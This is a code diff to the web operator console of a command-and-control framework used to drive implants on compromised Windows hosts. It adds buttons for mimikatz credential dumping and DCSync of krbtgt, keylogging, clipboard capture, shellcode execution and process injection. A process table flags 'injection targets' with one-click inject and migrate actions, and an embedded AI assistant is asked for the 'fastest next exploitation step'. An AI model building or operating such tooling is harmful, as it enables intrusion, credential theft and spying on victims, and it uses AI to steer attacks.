@@ -708,21 +708,51 @@ html,body { height:100%; background:var(--bg); color:var(--text); font:12px/1.5 
   padding:6px 12px; background:var(--surf2); border-bottom:1px solid var(--border);
   display:flex; gap:4px; flex-wrap:wrap; align-items:center; flex-shrink:0;
 }
-.qlabel { font-size:9px; color:var(--dim); letter-spacing:.08em; margin-right:3px; }
+.qlabel {
+  font-size:9px; color:var(--red2); letter-spacing:.1em; font-weight:600;
+  padding:1px 6px 1px 4px; border-left:2px solid var(--red);
+  background:var(--red4); border-radius:0 2px 2px 0;
+  margin-right:3px; margin-left:6px; align-self:center; flex-shrink:0;
+}
+.qlabel:first-child { margin-left:0; }
 .qbtn {
   padding:2px 7px; font-size:10px; border:1px solid var(--bord2); border-radius:2px;
   background:var(--surf3); color:var(--dim2); cursor:pointer; font-family:var(--mono);
   transition:all .1s;
 }
 .qbtn:hover { border-color:var(--red); color:var(--red2); }
+/* ── Astaroth inline strip ── */
+#ast-strip {
+  display:none; padding:5px 12px; background:var(--red4);
+  border-bottom:1px solid var(--red3); flex-shrink:0;
+  align-items:center; gap:8px; cursor:pointer; min-height:28px;
+}
+#ast-strip.has-content { display:flex; }
+#ast-strip:hover { background:var(--red3); }
+#ast-strip-chip { font-size:9px; color:var(--red2); letter-spacing:.1em; font-weight:700; flex-shrink:0; }
+#ast-strip-text { font-size:10px; color:var(--dim2); flex:1; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+#ast-strip-analyze {
+  font-size:9px; color:var(--dim); padding:2px 6px;
+  border:1px solid var(--bord2); border-radius:2px;
+  background:var(--surf2); cursor:pointer; flex-shrink:0; font-family:var(--mono);
+}
+#ast-strip-analyze:hover { border-color:var(--red); color:var(--red2); }
+#ast-strip-analyze.spinning { color:var(--amber); border-color:var(--amber); }
+/* ── shell output ── */
 #shell-out {
   flex:1; overflow-y:auto; padding:10px 14px;
-  font:12px/1.65 var(--mono); background:var(--bg);
+  font:12px/1.65 var(--mono); background:var(--bg); position:relative;
+}
+#shell-out:empty::before {
+  content:"run a command to begin";
+  position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
+  color:var(--bord2); font-size:11px; letter-spacing:.06em; pointer-events:none;
 }
 .sl { word-break:break-all; }
-.sl-cmd-line { display:flex; gap:6px; margin-top:8px; margin-bottom:2px; }
+.sl-cmd-line { display:flex; gap:6px; margin-top:8px; margin-bottom:2px; align-items:baseline; }
 .sl-prompt { color:var(--red); flex-shrink:0; }
-.sl-cmd    { color:#e5e7eb; }
+.sl-cmd    { color:#e5e7eb; flex:1; }
+.sl-ts     { font-size:9px; color:var(--bord2); flex-shrink:0; margin-left:auto; }
 .sl-output { color:#9ca3af; white-space:pre-wrap; padding-left:2px; }
 .sl-err    { color:#f87171; }
 .sl-info   { color:var(--dim2); font-style:italic; }
@@ -770,6 +800,26 @@ html,body { height:100%; background:var(--bg); color:var(--text); font:12px/1.5 
 .info-grid { display:grid; grid-template-columns:auto 1fr; gap:6px 16px; font-size:11px; margin-bottom:16px; }
 .info-key { color:var(--dim); }
 .info-val { color:var(--text); }
+
+/* ── process table ── */
+.proc-table-wrap { overflow-x:auto; margin-top:4px; }
+.proc-table { border-collapse:collapse; font-size:10.5px; width:100%; min-width:520px; }
+.proc-table th {
+  text-align:left; padding:3px 8px; color:var(--dim);
+  border-bottom:1px solid var(--bord2); font-weight:600; white-space:nowrap;
+  letter-spacing:.06em; font-size:9.5px;
+}
+.proc-table td { padding:2px 8px; color:#9ca3af; border-bottom:1px solid var(--border); white-space:nowrap; }
+.proc-table tr:hover td { background:var(--surf2); color:var(--text); }
+.proc-table tr.proc-target td { color:#fca5a5; }
+.proc-table tr.proc-target:hover td { background:rgba(239,68,68,.08); }
+.proc-pid { color:var(--dim2); font-size:10px; }
+.proc-name { color:var(--text); font-weight:500; }
+.proc-inject-btn {
+  background:transparent; border:1px solid var(--bord2); color:var(--dim2);
+  font-size:9px; padding:1px 5px; border-radius:2px; cursor:pointer; margin-right:3px;
+}
+.proc-inject-btn:hover { border-color:var(--red2); color:var(--red2); }
 
 /* ── Arsenal ── */
 .art-cat { font-size:9px; letter-spacing:.12em; color:var(--dim); margin:14px 0 6px; }
@@ -1002,12 +1052,14 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
               <button class="qbtn" onclick="qi('hostname')">hostname</button>
               <button class="qbtn" onclick="qi('ipconfig /all')">ipconfig</button>
               <button class="qbtn" onclick="qi('systeminfo')">sysinfo</button>
-              <button class="qbtn" onclick="qi('tasklist /v')">tasklist</button>
+              <button class="qbtn" onclick="qi('ps')">ps</button>
               <button class="qbtn" onclick="qi('netstat -ano')">netstat</button>
               <button class="qbtn" onclick="qi('net share')">shares</button>
               <button class="qbtn" onclick="qi('arp -a')">arp</button>
+              <button class="qbtn" onclick="qi('env')">env</button>
               <button class="qbtn" onclick="qi('migrate')">migrate</button>
               <button class="qbtn" onclick="qi('screenshot')">screenshot</button>
+              <button class="qbtn" onclick="qi('clip')">clip</button>
               <span class="qlabel" style="margin-left:8px">AD▸</span>
               <button class="qbtn" onclick="qi('net user /domain')">users</button>
               <button class="qbtn" onclick="qi('net group \"Domain Admins\" /domain')">DA</button>
@@ -1026,6 +1078,11 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
               <button class="qbtn" onclick="qi('SharpLAPS /host:')">LAPS</button>
               <button class="qbtn" onclick="qi('mimikatz sekurlsa::logonpasswords exit')">sekurlsa</button>
               <button class="qbtn" onclick="qi('mimikatz lsadump::dcsync /user:krbtgt exit')">dcsync</button>
+              <button class="qbtn" onclick="qi('sleep 5000')">sleep 5s</button>
+              <button class="qbtn" onclick="qi('sleep 30000')">sleep 30s</button>
+              <button class="qbtn" onclick="qi('keylog start')">klog▸start</button>
+              <button class="qbtn" onclick="qi('keylog dump')">klog▸dump</button>
+              <button class="qbtn" onclick="qi('keylog stop')">klog▸stop</button>
               <span class="qlabel" style="margin-left:8px">TOKEN▸</span>
               <button class="qbtn" onclick="qi('getuid')">getuid</button>
               <button class="qbtn" onclick="qi('steal_token ')">steal_token</button>
@@ -1036,6 +1093,16 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
               <button class="qbtn" onclick="qi('ls ')">ls</button>
               <button class="qbtn" onclick="qi('cd ')">cd</button>
               <button class="qbtn" onclick="qi('download ')">download</button>
+              <span class="qlabel" style="margin-left:8px">EXEC▸</span>
+              <button class="qbtn" onclick="qi('execasm ')">execasm</button>
+              <button class="qbtn" onclick="qi('shellcode ')">shellcode</button>
+              <button class="qbtn" onclick="qi('inject ')">inject</button>
+              <button class="qbtn" onclick="qi('portscan ')">portscan</button>
+            </div>
+            <div id="ast-strip" onclick="toggleAstaroth()">
+              <span id="ast-strip-chip">⟁ ASTAROTH</span>
+              <span id="ast-strip-text"></span>
+              <button id="ast-strip-analyze" onclick="event.stopPropagation();astAutoAnalyze()">auto-analyze</button>
             </div>
             <div id="shell-out"></div>
             <div id="shell-input-bar">
@@ -1228,6 +1295,7 @@ let shellHist    = [];
 let histIdx      = -1;
 let pendingPolls = {};   // task_id → intervalId
 let pendingEls   = {};   // task_id → pending DOM element
+let taskCmds     = {};   // task_id → command string (for binary result rendering)
 let curTab       = 'shell';
 let curGV        = 'ops';
 
@@ -1272,6 +1340,9 @@ function handleSSE(ev) {
       renderSessList();
       updateArsSessSelect();
       break;
+    case 'task_queued':
+      if (ev.cmd) taskCmds[ev.task_id] = ev.cmd;
+      break;
     case 'task_result':
       if (pendingPolls[ev.task_id]) {
         clearInterval(pendingPolls[ev.task_id]);
@@ -1299,22 +1370,35 @@ function handleSSE(ev) {
       break;
     }
     case 'ast_token': {
-      const b = astPending[ev.id];
-      if (b) {
-        b.classList.remove('ast-streaming');
-        b.textContent += ev.token;
-        const msgs = document.getElementById('ast-msgs');
-        if (msgs) msgs.scrollTop = msgs.scrollHeight;
+      if (astStripStreams.has(ev.id)) {
+        astStripBuf += ev.token;
+        updateAstStrip(astStripBuf);
+      } else {
+        const b = astPending[ev.id];
+        if (b) {
+          b.classList.remove('ast-streaming');
+          b.textContent += ev.token;
+          const msgs = document.getElementById('ast-msgs');
+          if (msgs) msgs.scrollTop = msgs.scrollHeight;
+        }
       }
       break;
     }
     case 'ast_done': {
-      const b = astPending[ev.id];
-      if (b) {
-        b.classList.remove('ast-streaming');
-        if (ev.error) b.textContent = (b.textContent || '') + '\n\n[' + ev.error + ']';
-        if (!b.textContent.trim()) b.textContent = '[no response]';
-        delete astPending[ev.id];
+      if (astStripStreams.has(ev.id)) {
+        astStripStreams.delete(ev.id);
+        const btn = document.getElementById('ast-strip-analyze');
+        if (btn) { btn.textContent = 'auto-analyze'; btn.classList.remove('spinning'); }
+        if (ev.error) updateAstStrip('[' + ev.error.slice(0,80) + ']');
+        else if (!astStripBuf.trim()) updateAstStrip('[no response]');
+      } else {
+        const b = astPending[ev.id];
+        if (b) {
+          b.classList.remove('ast-streaming');
+          if (ev.error) b.textContent = (b.textContent || '') + '\n\n[' + ev.error + ']';
+          if (!b.textContent.trim()) b.textContent = '[no response]';
+          delete astPending[ev.id];
+        }
       }
       break;
     }
@@ -1426,6 +1510,7 @@ async function selectSession(sid) {
 function deselectSession() {
   selectedSid = null;
   sessDetail  = {};
+  updateAstStrip(null);
   document.getElementById('no-session').style.display    = 'flex';
   document.getElementById('session-panel').style.display = 'none';
   renderSessList();
@@ -1456,9 +1541,14 @@ function renderSessionHeader() {
   const tasks  = sessDetail.tasks || [];
   const creds  = tasks.filter(t => t.has_creds).length;
   const techs  = new Set(tasks.map(t=>t.technique_id).filter(Boolean)).size;
-  document.getElementById('hdr-tasks').textContent = tasks.length;
-  document.getElementById('hdr-creds').textContent = creds;
-  document.getElementById('hdr-techs').textContent = techs;
+  const setStatBadge = (id, val, color) => {
+    const el = document.getElementById(id);
+    el.textContent = val;
+    el.style.color = val > 0 ? color : '';
+  };
+  setStatBadge('hdr-tasks', tasks.length, 'var(--dim2)');
+  setStatBadge('hdr-creds', creds,        'var(--glow)');
+  setStatBadge('hdr-techs', techs,        'var(--red2)');
 
   let badge = '';
   if (live) {
@@ -1609,13 +1699,33 @@ function shellKey(e) {
   }
 }
 
+const _CMD_ALIASES = {
+  'ps':      'tasklist /V /FO TABLE',
+  'ifconfig':'ipconfig /all',
+  'cat':     'type',
+  'env':     'set',
+  'clip':    'powershell -NoP -NonI -Command "Get-Clipboard"',
+  'clear':   '__clear__',
+  'cls':     '__clear__',
+};
+
+function normalizeCmd(raw) {
+  const parts = raw.trim().split(/\s+/);
+  const alias = _CMD_ALIASES[parts[0].toLowerCase()];
+  if (!alias) return raw;
+  if (alias === '__clear__') { shellClear(); return null; }
+  return parts.length > 1 ? alias + ' ' + parts.slice(1).join(' ') : alias;
+}
+
 async function shellSend() {
   const inp = document.getElementById('shell-input');
-  const cmd = inp.value.trim();
+  let cmd = inp.value.trim();
   if (!cmd) return;
   if (!selectedSid) { shellAppend('info', '— no session selected'); return; }
   inp.value = '';
   histIdx   = -1;
+  cmd = normalizeCmd(cmd);
+  if (!cmd) return;
   shellHist.push(cmd);
   if (shellHist.length > 300) shellHist.shift();
 
@@ -1634,7 +1744,9 @@ async function shellSend() {
       return;
     }
     const {task_id} = await r.json();
+    taskCmds[task_id] = cmd;
     pendEl.textContent = '  ▸ waiting…';
+    pendingEls[task_id] = pendEl;
 
     // SSE will resolve this fast; 2s poll is the fallback
     let n = 0;
@@ -1645,6 +1757,7 @@ async function shellSend() {
         if (res.status === 200) {
           clearInterval(iv);
           delete pendingPolls[task_id];
+          delete pendingEls[task_id];
           const txt = await res.text();
           pendEl.remove();
           appendShellResult(task_id, txt, false);
@@ -1667,7 +1780,9 @@ function shellAppendCmd(cmd) {
   const out = document.getElementById('shell-out');
   const d   = document.createElement('div');
   d.className = 'sl sl-cmd-line';
-  d.innerHTML = `<span class="sl-prompt">C2&gt;</span><span class="sl-cmd">${esc(cmd)}</span>`;
+  const now = new Date();
+  const ts  = now.toTimeString().slice(0,8);
+  d.innerHTML = `<span class="sl-prompt">C2&gt;</span><span class="sl-cmd">${esc(cmd)}</span><span class="sl-ts">${ts}</span>`;
   out.appendChild(d);
   shellScroll();
   return d;
@@ -1683,13 +1798,115 @@ function shellAppend(type, text) {
   return d;
 }
 
+// Injection-friendly targets — highlight in process table
+const _PROC_TARGETS = new Set([
+  'runtimebroker.exe','explorer.exe','svchost.exe','mmc.exe',
+  'wmiprvse.exe','conhost.exe','taskhostw.exe','dllhost.exe',
+  'werfault.exe','searchindexer.exe','sihost.exe',
+]);
+
+function renderProcessTable(container, txt) {
+  const lines = txt.replace(/\r/g,'').split('\n').filter(l => l.trim());
+  const sepIdx = lines.findIndex(l => /^[= ]+$/.test(l.trim()) && l.includes('='));
+  if (sepIdx < 1) { container.textContent = txt; return; }
+
+  const sep = lines[sepIdx];
+  // Parse column start/end positions from separator
+  const cols = [];
+  let i = 0;
+  while (i < sep.length) {
+    if (sep[i] === '=') {
+      const s = i;
+      while (i < sep.length && sep[i] !== ' ') i++;
+      cols.push([s, i]);
+    } else { i++; }
+  }
+  if (cols.length < 2) { container.textContent = txt; return; }
+
+  const extract = line => cols.map(([s,e]) => (line.slice(s,e)||'').trim());
+  const dataRows = lines.slice(sepIdx+1)
+    .map(extract)
+    .filter(r => r[0]); // skip empty
+
+  const wrap = document.createElement('div');
+  wrap.className = 'proc-table-wrap';
+  const tbl = document.createElement('table');
+  tbl.className = 'proc-table';
+  // thead
+  const thead = tbl.createTHead();
+  const htr = thead.insertRow();
+  ['PID','Process','User','Mem',''].forEach(h => {
+    const th = document.createElement('th'); th.textContent = h; htr.appendChild(th);
+  });
+  // tbody
+  const tbody = tbl.createTBody();
+  dataRows.forEach(row => {
+    const name = row[0]||'';
+    const pid  = (row[1]||'').replace(/,/g,'').trim();
+    const mem  = row[4]||'';
+    const user = (row[6]||'').split('\\').pop()||'—';
+    const tr = tbody.insertRow();
+    if (_PROC_TARGETS.has(name.toLowerCase())) tr.className = 'proc-target';
+    const tdPid = tr.insertCell(); tdPid.className='proc-pid'; tdPid.textContent = pid;
+    const tdName= tr.insertCell(); tdName.className='proc-name'; tdName.textContent = name;
+    const tdUser= tr.insertCell(); tdUser.textContent = user;
+    const tdMem = tr.insertCell(); tdMem.textContent = mem;
+    const tdAct = tr.insertCell();
+    if (pid && pid !== '0' && pid !== '4') {
+      const b1 = document.createElement('button');
+      b1.className='proc-inject-btn'; b1.textContent='inject'; b1.title='wnfinject '+pid;
+      b1.onclick = () => { qi('wnfinject '+pid); document.getElementById('shell-input').focus(); };
+      const b2 = document.createElement('button');
+      b2.className='proc-inject-btn'; b2.textContent='migrate'; b2.title='migrate '+pid;
+      b2.onclick = () => { qi('migrate '+pid); document.getElementById('shell-input').focus(); };
+      tdAct.appendChild(b1); tdAct.appendChild(b2);
+    }
+  });
+  tbl.appendChild(tbody);
+  wrap.appendChild(tbl);
+  container.appendChild(wrap);
+  const note = document.createElement('div');
+  note.style.cssText='font-size:9.5px;color:var(--dim);margin-top:4px;';
+  note.textContent = `${dataRows.length} processes — highlighted = injection targets`;
+  container.appendChild(note);
+}
+
 function appendShellResult(tid, txt, hasCreds) {
+  const baseCmd = (taskCmds[tid] || '').trim().toLowerCase().split(/\s+/)[0];
+  delete taskCmds[tid];
   const out = document.getElementById('shell-out');
   const d   = document.createElement('div');
   d.className = 'sl sl-output';
   if (hasCreds) {
     d.className = 'sl sl-cred';
     d.textContent = '⚷ CREDS DETECTED\n' + txt;
+  } else if (txt && txt.startsWith('_BIN_B64:\n')) {
+    const b64 = txt.slice(10).trim();
+    if (baseCmd === 'screenshot') {
+      const img = document.createElement('img');
+      img.src = 'data:image/bmp;base64,' + b64;
+      img.style.cssText = 'max-width:100%;border:1px solid var(--bord2);margin-top:4px;display:block;cursor:pointer;';
+      img.title = 'click to open full size';
+      img.onclick = () => window.open(img.src, '_blank');
+      d.appendChild(img);
+    } else {
+      // download: decode bytes → show as text if valid UTF-8, else offer binary link
+      try {
+        const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+        const decoded = new TextDecoder('utf-8', {fatal: true}).decode(bytes);
+        d.textContent = decoded;
+      } catch(_) {
+        const a = document.createElement('a');
+        a.href = 'data:application/octet-stream;base64,' + b64;
+        a.download = 'file';
+        a.textContent = '[binary — click to save]';
+        a.style.color = 'var(--dim2)';
+        d.appendChild(a);
+      }
+    }
+  } else if ((baseCmd === 'tasklist') && txt && txt.includes('========')) {
+    // Process list: render as interactive table
+    renderProcessTable(d, txt);
   } else {
     d.textContent = txt || '(empty)';
   }
@@ -2050,6 +2267,45 @@ function astAppend(type, text) {
   msgs.appendChild(d);
   msgs.scrollTop = msgs.scrollHeight;
   return d;
+}
+
+// ── Astaroth inline strip ──────────────────────────────────────────────────
+let astStripStreams = new Set();  // stream_ids that feed the strip, not the panel
+let astStripBuf    = '';
+
+function updateAstStrip(text) {
+  const strip = document.getElementById('ast-strip');
+  const txt   = document.getElementById('ast-strip-text');
+  if (!strip || !txt) return;
+  if (text === null) { strip.classList.remove('has-content'); return; }
+  txt.textContent = text;
+  strip.classList.add('has-content');
+}
+
+async function astAutoAnalyze() {
+  if (!selectedSid) return;
+  const btn = document.getElementById('ast-strip-analyze');
+  btn.textContent = '…';
+  btn.classList.add('spinning');
+  astStripBuf = '';
+  updateAstStrip('analyzing…');
+  try {
+    const r = await fetch('/ui/api/astaroth/consult', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        question: 'Fastest next exploitation step based on current session? One sentence, lead with the tool name.',
+        session_id: selectedSid || '',
+      }),
+    });
+    if (!r.ok) { updateAstStrip('[error ' + r.status + ']'); btn.textContent='auto-analyze'; btn.classList.remove('spinning'); return; }
+    const {stream_id} = await r.json();
+    astStripStreams.add(stream_id);
+  } catch(e) {
+    updateAstStrip('[' + e.message + ']');
+    btn.textContent = 'auto-analyze';
+    btn.classList.remove('spinning');
+  }
 }
 
 // ── Admin ──────────────────────────────────────────────────────────────────
